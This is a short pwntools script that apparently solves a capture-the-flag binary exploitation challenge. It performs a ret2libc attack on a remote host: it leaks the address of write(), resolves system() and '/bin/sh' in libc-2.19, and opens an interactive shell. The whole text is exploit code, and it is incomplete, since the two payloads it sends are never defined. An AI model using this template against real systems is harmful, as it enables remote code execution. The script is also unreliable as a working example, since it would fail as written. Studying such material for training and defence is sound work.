from pwn import * 
#context.log_level="debug" 
elf=ELF("level3_x64") 
write_plt=elf.symbols["write"] 
write_got=elf.got["write"] 
vul_addr=elf.symbols['vulnerable_function']

p=remote("47.116.107.8",9883) 
p.recvuntil(b"Input:\n") 
pop_rdi_addr=0x00000000004006b3   #0x00000000004006b3 : pop rdi ; ret
pop_rsi_r15_addr=0x00000000004006b1      #0x00000000004006b1 : pop rsi ; pop r15 ; ret

p.sendline(payload1) 
t=p.recv(8)
write_addr=u64(t[0:8]) 

libc=ELF("libc-2.19.so") 
offset=write_addr-libc.symbols["write"] 
sys_addr=offset+libc.symbols["system"] 
bin_addr=offset+next(libc.search(b"/bin/sh"))
p.sendline(payload2) 
p.interactive()
